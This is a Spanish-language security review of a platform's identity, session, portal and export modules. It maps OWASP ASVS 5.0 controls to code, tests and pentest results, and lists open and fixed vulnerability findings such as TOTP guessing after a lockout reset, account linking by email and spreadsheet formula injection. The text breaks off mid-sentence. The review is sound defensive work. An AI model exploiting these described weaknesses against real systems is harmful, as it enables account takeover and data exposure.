# Revisión de seguridad de F4: alcance, checklist y resultados

> **Estado:** revisión dedicada hecha (HU 4.10, parte 2), 24/10/2026, sobre la rama `f4/revision-seguridad` (punta de
> `f4/portal-integracion` en `efdce5a`). La parte 1 dejó el alcance y el checklist; esta parte llena la columna
> «Estado» con evidencia, documenta la prueba de penetración del módulo de identidad (§5) y los hallazgos (§6).
> Los números de requisito son los de **OWASP ASVS 5.0** nivel 2, por sección; **[por verificar]** el número exacto de
> cada requisito contra la versión 5.0.0 publicada.
>
> **Cómo se hizo:** lectura del código y de las pruebas de cada área, y ataques reproducidos con pruebas automatizadas
> contra atlas-api local (Postgres 16 y Redis 8.6 reales con Testcontainers, `EntornoApi`). **No** se atacó qa, pdn ni
> ningún host de flitsas ni de terceros. Las pruebas que demuestran que un control funciona quedan como regresión en
> `services/api/tests/Flit.Atlas.Api.Tests/Seguridad/`; las que demuestran un hallazgo de severidad media o mayor
> quedan omitidas con `Skip = "Hallazgo F4-SEC-NN"` (se verificó que fallan al quitar el `Skip`) y se quitan al corregir.
>
> **Resumen:** 33 controles: **15 cumplen, 17 parciales, 0 no cumplen, 1 no aplica**. 34 hallazgos: **1 alto, 12
> medios, 19 bajos y 2 informativos** (el F4-SEC-33 y el `re.fullmatch` del F4-SEC-34 se corrigieron aquí).
> **No se recomienda abrir el acceso a externos en pdn** hasta cerrar lo que pide la §8.
>
> **Actualización 24/10/2026 (identidad):** corregidos en `2078282` (rama `f4/seguridad-identidad`, ATLAS-ADR-0049,
> **propuesto**) F4-SEC-01 a 05, 07, 08, 13, 14, 18, 19 y 21; F4-SEC-06 queda como riesgo residual documentado (solo el
> buzón) con aviso al titular, a la espera de que el líder acepte el ADR. Sus pruebas ya no se omiten. Pasan a **cumplir**
> V6.3, V6.5, V6.8, V7.4 y V7.6; V6.4 sigue **parcial** hasta aceptar el riesgo. Quedan de identidad: F4-SEC-15, 16, 17,
> 20, 31 y la agrupación de IPv6 por /64.

## 1. Alcance

| Área | Qué entra | Dónde vive | Decisiones |
|---|---|---|---|
| Registro por invitación | Invitación de un solo uso (72 h, token solo como hash), aceptación con passkey o contraseña + TOTP, términos (Ley 1581), administrador de la organización | `services/api/src/Flit.Atlas.Identidad/Externos/` | ATLAS-ADR-0025 |
| MFA y passkeys | WebAuthn de ASP.NET Core Identity (.NET 10), TOTP, códigos de recuperación con hash, segundo factor obligatorio para externos | `Externos/FactoresExternos.cs`, `Externos/CuentasExternas.cs`, `Externos/AlmacenUsuarios.cs` | ATLAS-ADR-0025 |
| Recuperación | Enlace de un solo uso por correo y nuevo registro del factor; restablecimiento forzado por un administrador | `Externos/EndpointsCuentasExternas.cs`, `Externos/TokensEnlace.cs`, `Externos/EndpointsAdministracionExternos.cs` | ATLAS-ADR-0025 |
| Empleados | OIDC con PKCE contra Entra ID, tenant único (`tid`), aprovisionamiento just-in-time, mapeo de grupos a roles | `Identidad/Entra/`, `Identidad/Aprovisionamiento/` | ATLAS-ADR-0004 |
| Sesiones | Cookie `__Host-atlas` (HttpOnly, Secure, SameSite=Strict) con solo el id; sesión en el servidor con sello de seguridad comparado en cada petición; sesión nueva en cada ingreso; dispositivos conectados; reautenticación (10 min); sesión más corta para externos | `Identidad/Sesiones/`, `Identidad/EndpointsSesiones.cs`, `Identidad/Seguridad/Reautenticacion.cs`, `Identidad/Seguridad/InvalidadorSesiones.cs` | ATLAS-ADR-0008, ATLAS-ADR-0022 |
| Tokens OpenIddict | Código con PKCE (atlas-cli, MCP), `client_credentials` (servicios), refresh con rotación y detección de reutilización, audiencias y scopes, JWKS, certificados en SealedSecret | `Identidad/Tokens/` | ATLAS-ADR-0024, ATLAS-ADR-0044 |
| Cuenta de emergencia | Activación por `kubectl exec` con enlace de un solo uso, MFA local, eventos de alta severidad | `Identidad/Emergencia/` | ATLAS-ADR-0027 |
| Portal y aislamiento | `contratos_comparticion` con RLS como única puerta, `AccesoPortal` en cada petición, spec podado, auditoría de cada vista | `Flit.Atlas.Modulos.Contratos/Portal/`, `Comparticiones/`, `Poda/` | ATLAS-ADR-0038, ATLAS-ADR-0043 |
| Exportaciones y URL firmadas | Cola, entrada en el S3, URL SigV4 de 15 min, retención, tope en curso, auditoría | `Flit.Atlas.Modulos.Contratos/Exportaciones/`, `Flit.Atlas.Plataforma/Almacenamiento/`, `services/docs/` | ATLAS-ADR-0042, ATLAS-ADR-0048 |
| Publicación OIDC desde CI | Token de GitHub Actions validado con JWKS, audiencia por ambiente, lista blanca por repo, rama y workflow reutilizable fijado | `Flit.Atlas.Plataforma/Publicacion/`, `Flit.Atlas.Modulos.Contratos/EndpointsPublicacion.cs`, `.github/workflows/atlas-publicar.yml` | ATLAS-ADR-0009, ATLAS-ADR-0035 |
| atlas-docs con JWT | Token `client_credentials` de OpenIddict con audiencia `atlas-docs` validado con el JWKS; usuario de RabbitMQ por servicio | `services/docs/src/atlas_docs/autenticacion.py`, `cola.py` | ATLAS-ADR-0044 |
| Endurecimiento | CSP y cabeceras (API, PWA, visor), informes de violaciones, límites de tasa | `Flit.Atlas.Api/CabecerasSeguridad.cs`, `Identidad/Seguridad/LimitacionTasa.cs`, `EndpointsReportesCsp.cs`, `apps/web/deploy/` | ATLAS-ADR-0039, ATLAS-ADR-0048 |

Fuera de alcance: el asistente (F7, OWASP Top 10 para LLM), los legados y FLIT 1, la infraestructura de las VPS (salvo lo
que el checklist marca como dependencia de `flit-gitops`).

### Para la prueba de penetración de identidad

Se hizo **en local** (atlas-api con `EntornoApi`: Postgres y Redis de Testcontainers, buzón de correo en memoria, reloj
desplazable), no en qa: lo que depende de la topología real (nginx del host, Ingress, `RedesConfiables`, HIBP, Entra con
`auth_time`) queda en §4 como pendiente. La suite oficial de la OpenID Foundation contra qa sigue pendiente (§4). Casos
mínimos y resultado en §5.

## 2. Checklist ASVS 5.0 nivel 2

Rutas relativas a `services/api/src/` salvo que se diga otra cosa. «Pentest» = prueba nueva en
`services/api/tests/Flit.Atlas.Api.Tests/Seguridad/`.

### V6 · Autenticación

| Sección | Control en Atlas | Dónde | Pruebas que ya lo cubren | Estado |
|---|---|---|---|---|
| V6.1 Documentación | Métodos por tipo de cuenta, límites y bloqueo documentados | ATLAS-ADR-0004, 0022, 0025, 0027 | — | **Cumple.** Los ADR describen métodos, límites, bloqueo y recuperación; la recuperación sin factor previo (F4-SEC-06) está documentada como diseño en ATLAS-ADR-0025, sin análisis del riesgo. |
| V6.2 Contraseñas | Mínimo 12, sin reglas de composición, revisión contra filtraciones (lista local y consulta por rango a Have I Been Pwned), hash de ASP.NET Core Identity (PBKDF2), solo para externos | `Externos/ValidadorContrasenaFiltrada.cs`, `Datos/IdentidadDbContext.cs` (`ConfigurarIdentity`) | `CuentasExternasTests` | **Parcial.** Cumple: mínimo 12 sin tope (`Datos/IdentidadDbContext.cs:47-56`; `RequiredUniqueChars = 4` es una regla leve), HIBP por rango con relleno y host fijo (`ValidadorContrasenaFiltrada.cs:74-106`, `ExtensionesIdentidad.cs:225-229`), correo dentro de la contraseña rechazado (`:68-70`), PBKDF2 de Identity. Falta: si HIBP no responde la revisión pasa (`:101-105`) y queda una lista local de 74 entradas, lejos de las 3000 que pide V6.2.4; no hay cambio de contraseña autenticado (V6.2.2/6.2.3): solo la recuperación (F4-SEC-31). |
| V6.3 Seguridad general | Bloqueo tras 10 fallos con duración progresiva; límite de tasa en toda ruta de identidad (por IP, por usuario, más estricto para externos); mensajes genéricos que no revelan si la cuenta existe | `Seguridad/VerificadorContrasena.cs`, `Seguridad/LimitacionTasa.cs`, `Externos/EndpointsCuentasExternas.cs` | `SeguridadTests`, `CuentasExternasTests` | **Cumple** desde `2078282` (ATLAS-ADR-0049): contadores separados y atómicos para contraseña y segundo factor que la contraseña correcta no reinicia, paso del segundo factor de 5 intentos, límite por cuenta atacada en Redis (20 cada 15 min, por correo exista o no), cuentas solo con passkey que no suman fallos de contraseña y hash ficticio siempre; pruebas `Pentest_los_fallos_de_TOTP…`, `…veinte_contrasenas_erradas_concurrentes…`, `…contrasenas_inventadas_no_bloquean…`, `…tras_cinco_codigos_errados…`, `…el_limite_por_cuenta…`, `…la_recuperacion_tarda_lo_mismo…`. Pendiente menor: IPv6 no se agrupa por /64. *Antes:* **Parcial.** Cumple por HTTP el bloqueo con 10 contraseñas erradas y con 10 códigos de recuperación errados (Pentest `…diez_contrasenas_erradas_por_HTTP…`, `…diez_codigos_de_recuperacion…`), y los cuerpos iguales para correo desconocido, contraseña errada, cuenta bloqueada y empleado (Pentest `…el_ingreso_responde_lo_mismo…`). Falla: la contraseña correcta reinicia el contador y deja adivinar el TOTP (**F4-SEC-01**), se pierden fallos concurrentes (F4-SEC-02), bloqueo dirigido de cuentas con passkey (F4-SEC-03), tiempos que revelan la cuenta (F4-SEC-04); el límite es por IP (IPv6 completa, sin /64), no por cuenta atacada (`LimitacionTasa.cs:126-146, 252`). |
| V6.4 Ciclo de vida y recuperación | Invitación y recuperación con enlace de un solo uso (hash, vencimiento), nuevo registro del factor, códigos de recuperación con hash | `Externos/TokensEnlace.cs`, `Externos/ServicioInvitaciones.cs`, `Externos/CorreosExternos.cs` | `CuentasExternasTests` | **Parcial.** Cumple: token de 256 bits, SHA-256 y comparación en tiempo constante (`TokensEnlace.cs:12-34`), 72 h exactas (Pentest `…hasta_las_72_horas…`), aceptación con `FOR UPDATE` (`CuentasExternas.cs:161-167`; Pentest `…dos_aceptaciones_simultaneas…`: una sola cuenta), tokens manipulados indistinguibles (Pentest `…tokens_de_invitacion_manipulados…`), recuperación de un solo uso, ligada al sello y que vence (Pentest `…recuperacion_no_sirve_dos_veces…`, `…recuperacion_vence`), códigos de recuperación con PBKDF2 (`AlmacenUsuarios.cs:386-416`). Falla: la recuperación reemplaza todos los factores solo con el buzón y sin aviso (**F4-SEC-06**). *Desde `2078282`:* aviso al titular sin enlaces, cierre de sesiones y tokens y factor nuevo obligatorio (`Pentest_recuperar_la_cuenta_con_el_buzon_avisa_al_titular…`); el riesgo del buzón queda documentado en ATLAS-ADR-0049 (**propuesto**): sigue **parcial** hasta que el líder lo acepte. |
| V6.5 MFA | Externos: passkey (factor fuerte) o contraseña + TOTP obligatorio; empleados: MFA de Entra (acceso condicional) | `Externos/FactoresExternos.cs`, `Externos/SesionExterna.cs` | `CuentasExternasTests` | **Parcial.** Cumple: passkey con UV y credencial descubrible obligatorias (`ExtensionesIdentidad.cs:219-224`), desafío de un solo uso, TOTP obligatorio con contraseña, sin sesión antes del segundo factor y pasos que no se inventan ni se cruzan (Pentest `…no_hay_sesion_sin_segundo_factor…`). Falla: reuso del TOTP con otro formato (**F4-SEC-05**), intentos del segundo factor sin bloqueo efectivo (F4-SEC-01). *Desde `2078282`* **cumple**: código normalizado una sola vez (6 dígitos) y último paso de tiempo aceptado por usuario en todos los caminos; segundo factor con bloqueo propio. El MFA de empleados depende del acceso condicional de Entra **[por verificar]**; `amr` no se exige. |
| V6.8 Proveedor de identidad | OIDC con PKCE, `state`, `nonce`, tenant validado (`tid`), cuentas personales rechazadas, `prompt=login` para reautenticar | `Entra/IngresoEntra.cs`, `Entra/ValidadorCuentaEntra.cs` | `ValidadorCuentaEntraTests`, `IdentidadTests`, `SeguridadTests` | **Parcial.** Cumple: PKCE (`ExtensionesIdentidad.cs:316-317`), `tid` validado aunque el `iss` diga ser el tenant de FLIT, cuentas personales e invitados rechazados (`ValidadorCuentaEntra.cs:31-56`; Pentest `…tid_ajeno_o_de_cuenta_personal…` de punta a punta por `AlValidarTokenAsync`: no crea persona), vínculo por `entra`+`oid`. Falla: un `oid` nuevo se enlaza **por correo** a una persona existente sin `oid` y hereda sus roles (**F4-SEC-07**). *Desde `2078282`* **cumple**: el ingreso enlaza solo por `oid` y niega con evento `vinculo_por_correo_rechazado`; la reautenticación pide `max_age=0` y exige `auth_time` reciente (F4-SEC-18). |
| Cuenta de emergencia | Sin contraseña por defecto, activación solo con acceso al clúster, MFA local, eventos de alta severidad | `Emergencia/` | `EmergenciaTests` | **Cumple.** Sin contraseña ni factor al crearla (`Emergencia/CuentaEmergencia.cs:118-134`), enlace de 1 h ligado al sello que cambia al activar y al repetir el comando (`:154, 238`), enlace solo por la salida estándar, no se puede suspender ni retirar, nunca se enlaza a Entra. Observaciones: dos eventos del comando no llegan a Loki (F4-SEC-21, corregido en `2078282`: el comando exporta por OpenTelemetry solo los `identidad.emergencia.*`); RBAC de `kubectl exec` **[por verificar en flit-gitops]**. |

### V7 · Sesión

| Sección | Control en Atlas | Dónde | Pruebas | Estado |
|---|---|---|---|---|
| V7.1 Documentación | Vidas: empleados 8 h deslizante **y 7 días absoluta**; externos 2 h deslizante y 24 h absoluta; reautenticación 10 min | `Sesiones/AlmacenSesiones.cs` (`OpcionesSesion`), ATLAS-ADR-0022 | — | **Parcial.** Los valores están en `OpcionesSesion` (`AlmacenSesiones.cs:16-37`); el tope de 7 días de empleados no estaba en este documento (corregido arriba) y `ExpireTimeSpan` de la cookie usa el valor por defecto, no el configurado (`ExtensionesIdentidad.cs:266`): cambiar `Identidad:Sesion:DeslizanteEmpleados` no cambia la cookie (F4-SEC-34). |
| V7.2 Fundamentos | Id de sesión aleatorio en el servidor, cookie cifrada con Data Protection (llaves compartidas y protegidas con certificado), sesión nueva en cada ingreso | `Sesiones/AlmacenSesiones.cs`, `Sesiones/RenovacionAlIngresar.cs`, `ExtensionesIdentidad.cs` (`ConfigurarCookie`, `ConfigurarProteccionDeDatos`) | `SesionesTests`, `IdentidadTests` | **Cumple.** Pentest `…fijacion_de_sesion…` (la cookie previa al ingreso, y la de otra persona, quedan inservibles) y `…cookie_alterada_o_inventada…`; llaves de Data Protection en Redis con certificado obligatorio en qa y pdn (`ExtensionesIdentidad.cs:282-303`). |
| V7.3 Vencimiento | Deslizante y absoluto validados en el servidor en cada petición | `AlmacenSesiones.RetrieveAsync` | `SesionesTests` | **Cumple.** `AlmacenSesiones.cs:157, 177`; Pentest `…sesion_inactiva_mas_de_la_ventana_deslizante…` (8 h + 5 min con el reloj desplazado: 401). |
| V7.4 Terminación | Cerrar sesión (con `Clear-Site-Data`), cerrar otras, cierre remoto por el administrador, sello que corta al suspender, cambiar roles o vencer | `EndpointsSesiones.cs`, `Seguridad/InvalidadorSesiones.cs`, `Autorizacion/VigilanteVencimientos.cs` | `SesionesTests`, `RolesTests` | **Parcial.** Cumple: cookie copiada a otro equipo deja de servir al cerrar sesión (Pentest `…cookie_copiada…`), y suspender, retirar asignaciones, borrar mapeos y vencer cortan sesiones, Bearer y refresh (`RolesTests`, `SesionesTests`, `TokensTests.Suspender_a_la_persona…`). Falla: los roles que vienen de grupos de Entra solo se recalculan en el ingreso interactivo; sacar a alguien del grupo no corta su sesión ni sus refresh (F4-SEC-08). *Desde `2078282`* **cumple**: la sincronización diaria recalcula `transitiveMemberOf` e invalida las sesiones si cambian (`SincronizacionPersonasTests.Recalcula_los_roles_de_los_grupos…`); el refresh de un externo no pasa de 24 h (F4-SEC-19). |
| V7.5 Abuso de sesión | Dispositivos conectados visibles; reautenticación para exportar, compartir, cambiar roles y factores | `Seguridad/Reautenticacion.cs`, `Plataforma/Permisos/Reautenticacion.cs` | `SesionesTests`, `ExportacionesTests`, `PortalContratosTests` | **Cumple.** El filtro falla cerrado sin identidad que lo verifique (`Plataforma/Permisos/Reautenticacion.cs:37-41`). Observación: crear, renovar, suspender y revocar invitaciones no piden reautenticación (F4-SEC-14, corregido en `2078282`). |
| V7.6 Reautenticación federada | `prompt=login` a Entra; `auth_time` del token | `Entra/IngresoEntra.cs` | `SeguridadTests` | **Parcial.** Se manda `prompt=login`, pero si Entra no envía `auth_time` la hora de ingreso es «ahora» y nada comprueba que la reautenticación fue real (F4-SEC-18). *Desde `2078282`* **cumple**: `max_age=0` y `auth_time` exigido de hace ≤ 5 min (`Pentest_una_reautenticacion_con_Entra_sin_auth_time…`); falta confirmar el claim en el registro de Entra **[por verificar]**. |
| CSRF (relacionado, V3.5) | `SameSite=Strict`, cabecera `X-Atlas-Csrf` y `Origin` del mismo host en toda mutación bajo `/api` | `EndpointsIdentidad.UseAntifalsificacionApi` | `IdentidadTests`, Pentest (`ProxyTests` **no** lo cubre, como decía la parte 1) | **Cumple** tras corregir F4-SEC-33 en esta revisión (`EndpointsIdentidad.cs`, exención del Bearer solo sin la cookie del BFF). Pentest `…csrf_con_sesion_sin_la_cabecera_o_con_Origin_ajeno…` (6 casos: sin cabecera, `Origin` ajeno, `null`, `http`, sufijo) y `…Bearer_inventado_no_exime…`. |

### V8 · Control de acceso

| Sección | Control en Atlas | Dónde | Pruebas | Estado |
|---|---|---|---|---|
| V8.1 Documentación | Matriz rol × permiso generada desde el código | `docs/permisos/matriz-rol-permiso.md`, `Plataforma/Permisos/` | `MatrizPermisosTests` | **Cumple.** `Plataforma/Permisos/ManifiestosNucleo.cs:70-91`; `MatrizPermisosTests.La_matriz_versionada_coincide_con_la_del_codigo`. |
| V8.2 Diseño | Permiso por endpoint (`RequierePermiso`), predicado obligatorio por organización en EF Core y RLS en las tablas con organización | `Plataforma/Permisos/Autorizacion.cs`, `Plataforma/Datos/` | `AutorizacionTests`, `Flit.Atlas.Plataforma.Tests/AislamientoTests` | **Parcial.** Cumple: `RequierePermiso` en todo endpoint con lista de públicos (`Autorizacion.cs:84-88`, `AutorizacionTests.Publicos`), predicado de EF (`Datos/ContextoAtlas.cs:51-79`), RLS FORCE en las tablas con `organizacion_id`. Falla: una petición sin sesión recibe el alcance del sistema y el rol de la app es dueño de las tablas, así que RLS no es segunda barrera en los endpoints anónimos; las pruebas de la API corren como superusuario (**F4-SEC-10**). El rol implícito por propiedad no exige que la persona sea empleada (F4-SEC-24). |
| V8.3 Por operación | El portal parte de las comparticiones de la organización de la sesión en cada petición (`AccesoPortal`); lo ajeno es 404; spec podado y verificado; exportaciones y descargas revisan el acceso otra vez | `Contratos/Portal/AccesoPortal.cs`, `Portal/SpecsDelPortal.cs`, `Exportaciones/EndpointsExportaciones.cs` | `AislamientoPortalTests` (bloquea el release), `PortalContratosTests`, `ExportacionesTests`, `Flit.Atlas.Modulos.Contratos.Tests/PortalTests` | **Parcial.** No se encontró IDOR entre organizaciones en portal, exportaciones (`PropiaAsync`), favoritos, comparticiones (`(Id, PaqueteId)` + `GestionableAsync`) ni sandbox (hash de la llave en tiempo fijo, `(Id, OrganizacionId)`); los 403 solo salen para paquetes ya visibles. Falla: la poda deja salir extensiones `x-flit-*` de procedencia interna (**F4-SEC-09**); la llave del sandbox sigue sirviendo cuando la persona pierde el acceso (F4-SEC-22); el changelog de la exportación nombra contratos fuera del alcance (F4-SEC-23). |
| V8.4 Otros | Vencimientos de asignaciones y comparticiones sin intervención; auditoría de solo inserción de cada vista, exportación y acceso negado de un externo | `Autorizacion/VigilanteVencimientos.cs`, `Plataforma/Entidades` (auditoría) | `RolesTests`, `Flit.Atlas.Plataforma.Tests/AuditoriaTests` | **Parcial.** Vigencias evaluadas en cada petición (`AccesoPortal.cs:203-205`, `PermisosEfectivos.cs:132-133`). Las negaciones de exportaciones y del proxy del sandbox no se auditan (F4-SEC-25). |

### V1 y V2 · Codificación, validación y lógica de negocio

| Sección | Control en Atlas | Dónde | Pruebas | Estado |
|---|---|---|---|---|
| V1 Codificación y sanitización | Markdown de las guías sin HTML (escapado) + DOMPurify con lista blanca; Mermaid estricto (F6); SVG sin scripts (render); páginas HTML de la API codificadas | `apps/web/src/modulos/contratos/guias/Markdown.tsx`, `Tokens/EndpointsTokens.cs` | pruebas de Vitest de `Markdown`, `TokensTests` | **Parcial.** PWA: marked escapa todo HTML y DOMPurify con lista blanca sin `style`/`class`/`img`, enlaces solo http(s)/mailto/ancla (`Markdown.tsx:24-60`), único `dangerouslySetInnerHTML` de la PWA; Mermaid aún no existe. atlas-docs: Jinja con `autoescape` (`exportes/html.py:206`), markdown-it con `html=False`, CSP `default-src 'none'` en el HTML exportado. Falla: inyección de fórmulas en el Excel exportado (**F4-SEC-11**). |
| V2.2 Validación de entrada | DTO validados en cada endpoint (ValidationProblem en español); topes de tamaño de cuerpo (Kestrel y lectura acotada); specs validados y con tope de 5 MB; alias de YAML acotados | endpoints de cada módulo, `Contratos/Specs/AnalizadorSpec.cs`, `EndpointsErroresCliente.cs`, `EndpointsReportesCsp.cs` | pruebas de cada módulo, `ErroresClienteTests`, `EndurecimientoTests` | **Parcial.** atlas-api: tope propio en publicación (`EndpointsPublicacion.cs:44-46`), spec de 5 MiB (`AnalizadorSpec.cs:50`), cuerpo del sandbox acotado; el resto usa el tope de Kestrel (30 MB). atlas-docs lee y parsea `POST /exportes` antes de validar el token y sin tope (F4-SEC-12) y trata specs patológicos como falla de infraestructura (F4-SEC-30). No se revisó endpoint por endpoint. |
| V2.3 Lógica de negocio | Reglas de paquetes y comparticiones (solo publicados, proveedores con vencimiento, revisión publicable); exportaciones con estados y resultados idempotentes | `Paquetes/ReglasPaquetes.cs`, `Comparticiones/ReglasComparticiones.cs`, `Exportaciones/ManejadorResultadosExportacion.cs` | `PaquetesContratosTests`, `ExportacionesTests` | **Cumple.** Observaciones informativas en F4-SEC-34 (permisos extra no atados a la invitación que los dio; comparticiones de proveedor sin tope de vigencia). |
| V2.4 Anti-automatización | Límites de tasa por persona, organización, IP y llave de sandbox; tope de exportaciones en curso con candado | `Seguridad/LimitacionTasa.cs`, `Exportaciones/ServicioExportaciones.cs` | `SeguridadTests`, `EndurecimientoTests`, `ExportacionesTests`, prueba de carga (`tests/carga/`) | **Parcial.** Los límites existen (`LimitacionTasa.cs:117-149`) y `CuentasExternasTests.Las_rutas_publicas_de_externos…` los prueba. Faltan límite por cuenta atacada y agrupación IPv6 /64 (F4-SEC-01), contadores distribuidos (por réplica, ATLAS-ADR-0048) y que el arranque falle sin `RedesConfiables` en qa y pdn (F4-SEC-13). |

### V4 · API y servicios web

| Sección | Control en Atlas | Dónde | Pruebas | Estado |
|---|---|---|---|---|
| V4.1 General | Contrato OpenAPI 3.1 generado y versionado, lint con vacuum (OWASP) en el CI; 429 declarado en toda operación; `Content-Type` correcto y `nosniff`; la cookie no sirve en endpoints con scope ni el Bearer en los de la PWA | `contracts/openapi/atlas.v1.yaml`, `contracts/vacuum/`, `Flit.Atlas.Api/ContratoOpenApi.cs` | `ContratoOpenApiTests`, `TokensTests` | **Cumple.** Separación cookie/Bearer (`Tokens/AutorizacionScopes.cs:29-43`); sin CORS en ningún lado (búsqueda); errores no controlados dan 500 sin cuerpo **[supuesto: qa y pdn sin `ASPNETCORE_ENVIRONMENT=Development`]**. |
| V4.2 Estructura de mensajes | Encabezados de proxy solo desde redes confiables (`Atlas:Proxy:RedesConfiables`, límite de saltos) | `Flit.Atlas.Api/Program.cs` | `ProxyTests` | **Parcial.** Solo `X-Forwarded-For` y `-Proto`, `ForwardLimit` 2, solo redes confiables (`Program.cs:36-47`). Sin `RedesConfiables` en qa o pdn el arranque no falla y los límites por IP se vuelven globales (F4-SEC-13); `ProxyTests` solo prueba la lectura de la configuración; reemplazo de `X-Forwarded-For` en el nginx del host **[por verificar]**. |
| V4.4 WebSocket | SignalR bajo `/hubs` con la sesión de la PWA y los límites por persona | `Flit.Atlas.Plataforma` | — | **No aplica hoy.** No hay `AddSignalR`, `MapHub` ni `Hub` en `services/api/src`; `/hubs` solo aparece en el limitador. Cuando llegue: validar `Origin` en el handshake (GET, no pasa por la antifalsificación). |
| Servicio a servicio | atlas-docs valida el JWT (firma con el JWKS, emisor, audiencia, scope, vencimiento); RabbitMQ con usuario por servicio | `services/docs/src/atlas_docs/autenticacion.py` | `services/docs/tests/test_autenticacion.py` | **Parcial.** Lista blanca RS256/PS256/ES256 antes de resolver la llave, `iss`/`aud`/`exp` obligatorios, scope, falla cerrado sin configuración (`autenticacion.py:45-70`; pruebas de `alg none`, HS256, otra llave, audiencia, emisor, vencido, `nbf`, `kid`). Falla: cuerpo leído antes del token y sin tope (F4-SEC-12), caché de llaves sin vencimiento y refresco del JWKS sin límite (F4-SEC-29), sin revisión de `typ` (F4-SEC-34); las pruebas usan un resolvedor falso, no `PyJWKClient`. Usuarios de RabbitMQ y `NetworkPolicy` **[por verificar en flit-gitops]**. |
| Publicación desde CI | JWKS de GitHub con caché y espera mínima, audiencia por ambiente, sin `pull_request`, workflow reutilizable fijado, lista blanca | `Plataforma/Publicacion/` | `Flit.Atlas.Plataforma.Tests/PublicacionCiTests`, `ModuloContratosTests` | **Cumple.** Solo RS256 con `kid`, emisor, audiencia por ambiente, vida máxima (`Publicacion/EsquemaGitHubActions.cs:66-118`); `refs/heads/` y `ref_type=branch`; eventos `push` y `workflow_dispatch`; `job_workflow_ref` comparado (`AutorizacionPublicacion.cs:83-87`); lista blanca por repo, rama, workflow, aplicativo y tipo; acciones fijadas por SHA. Observaciones en F4-SEC-27 (tags `v*`, audiencia independiente de la URL, nombre en lugar de id del repo). |

### V3 · Seguridad del frontend web (cabeceras)

| Sección | Control en Atlas | Dónde | Pruebas | Estado |
|---|---|---|---|---|
| V3.4 Cabeceras | CSP sin `unsafe-inline` en scripts ni estilos (salvo estilos del visor aislado), `frame-ancestors`, `base-uri`, `form-action`, `object-src 'none'`, informes; Trusted Types en modo informe; HSTS fuera de local; `nosniff`, `Referrer-Policy`, `Permissions-Policy`, COOP y CORP | `apps/web/deploy/`, `Flit.Atlas.Api/CabecerasSeguridad.cs` | `apps/web/tests/e2e/cabeceras.spec.ts`, `csp.spec.ts`, `modulos.spec.ts`, `portal.spec.ts`, `EndurecimientoTests` | **Cumple.** `apps/web/deploy/atlas-seguridad.conf:8-16`; `index.html` sin scripts en línea. Observaciones (F4-SEC-34): las respuestas de error que genera el propio nginx bajo `/api` (502, 504, 413) salen sin cabeceras; HSTS no se prueba (vacío en preview); la política Trusted Types `atlas-markdown` no se crea en el código (exigirla hoy rompería las guías); *source maps* públicos. |
| Iframe del visor | `sandbox` sin `allow-same-origin`, `postMessage` validado por origen y forma, «Probar» solo a QA y sandbox | `apps/web/src/modulos/contratos/visor/` | pruebas de Vitest del visor, `modulos.spec.ts` | **Cumple.** `sandbox="allow-scripts"` (`componentes/VisorScalar.tsx:76`) y CSP `sandbox allow-scripts` en nginx; mensajes validados por fuente, origen y forma (`visor/entrada.ts:122`, `mensajes.ts:194-197`, `VisorScalar.tsx:47`); `targetOrigin '*'` inevitable con origen opaco y sin datos hacia el padre; `customFetch` con prefijos y `credentials: 'omit'`. Hueco de pruebas: no hay Vitest de `esMensajeSpec`/`esMensajeVisor`. |

### Datos, URL firmadas y registros (V14, V16)

| Control | Dónde | Pruebas | Estado |
|---|---|---|---|
| URL firmadas SigV4 de 15 min (tope en configuración), un archivo por URL, como adjunto; descarga auditada | `Plataforma/Almacenamiento/AlmacenObjetos.cs`, `Exportaciones/EndpointsExportaciones.cs` | `ExportacionesTests`, `ExportacionesPuntaAPuntaTests` | **Cumple.** Máximo 15 min validado (`OpcionesExportaciones.cs:12, 53-55`); `Content-Disposition: attachment` saneado (`AlmacenObjetos.cs:173, 260-273`); la clave del objeto nunca viene del cliente (sale de `exportacion.Archivos`, filtrada por prefijo y sin `..`, `ManejadorResultadosExportacion.cs:83-87`). La PWA comparte el archivo descargado, nunca la URL firmada (`CompartirExportacion.tsx:73`). Recomendación menor: firmar con credenciales de solo lectura. |
| Retención de 7 días y borrado | `Exportaciones/VencedorExportaciones.cs` | `ExportacionesTests` | **Parcial.** 7 días (1 para fallidas) y borrado del prefijo (`VencedorExportaciones.cs:68-81`); las entradas subidas antes de una transacción fallida quedan huérfanas (F4-SEC-28). |
| Logs sin datos personales (errores de la PWA y CSP tachados; IP solo en tablas `@pii`) | `EndpointsErroresCliente.cs`, `EndpointsReportesCsp.cs` | `ErroresClienteTests`, `EndurecimientoTests` | **Cumple** según las pruebas existentes (pasan); atlas-docs no repite valores en los fallos de la cola (`cola.py:178`). No se auditó cada `ILogger` de la API. |
| Eventos de seguridad de solo inserción, con auditoría en la misma transacción | `Seguridad/RegistroSeguridad.cs` | `SeguridadTests` | **Cumple.** `RegistroSeguridad.cs:136-182`; `CuentasExternasTests.Todos_los_eventos…`. Huecos menores: un token inválido en `…/passkey/opciones` y `…/totp/clave` de invitación, recuperación y emergencia no registra `enlace_rechazado` (F4-SEC-34). |

## 3. Lo que ya cubren las pruebas automatizadas

- **.NET** (`dotnet test Flit.Atlas.slnx`, Postgres y Redis reales con Testcontainers): identidad, sesiones, cuentas
  externas, emergencia, tokens (suite propia de OIDC), autorización parametrizada por rol, matriz, aislamiento del
  portal (bloqueante), RLS en SQL directo, exportaciones de punta a punta con atlas-docs real, publicación desde CI,
  cabeceras, informes de CSP y límites de tasa. **Nuevo en la revisión:** `Seguridad/PentestCuentasExternasTests.cs`,
  `PentestSesionesTests.cs`, `PentestTokensTests.cs` y `PentestPodaTests.cs` (29 pruebas que pasan y 9 omitidas por
  hallazgo).
- **PWA** (Vitest y Playwright en escritorio, Pixel 7 e iPhone 14): sanitización del Markdown, visor aislado, CSP y
  cabeceras contra `vite preview` (las mismas de nginx) o la imagen.
- **atlas-docs** (pytest): validación del JWT y del consumidor de la cola. **Nuevo:**
  `tests/exportes/test_seguridad_excel.py` (omitida por F4-SEC-11).
- **Carga** (`tests/carga/`): 20 personas y 2 exportaciones con los límites de siempre.

Corrida de esta revisión: `dotnet test Flit.Atlas.slnx` sobre `efdce5a` antes de los cambios, todo en verde salvo
`ConsumoTests.Al_llegar_al_tope_o_si_es_ilegible_el_mensaje_queda_en_errores` (`NOT_FOUND - no queue …errores`,
inestabilidad conocida que se corrige aparte). Después de los cambios, la corrida completa se cortó por falta de memoria
de la máquina; se corrieron todos los proyectos salvo `Flit.Atlas.Api.Tests` completo (verdes, con el mismo
